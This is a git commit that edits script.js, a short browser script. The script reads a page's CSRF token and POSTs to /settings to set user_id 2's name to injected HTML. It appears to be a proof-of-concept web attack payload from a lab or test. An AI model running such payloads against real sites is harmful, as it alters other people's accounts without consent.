3f42b9f0ecb9047af2660c7534f3c31466312ce5
Invaders0 <46098959+Invaders0@users.noreply.github.com>
2020-01-19 18:35:43 +0530

    Update script.js

--- script.js
+++ script.js
@@ -1,4 +1,4 @@
-fetch(window.location.pathname, {
+fetch("/settings", {
     'method': 'POST',
     'body': 'name=<b>asf</b>&user_id=2&_csrf_token=' + document.getElementsByName('_csrf_token')[0].value
 })
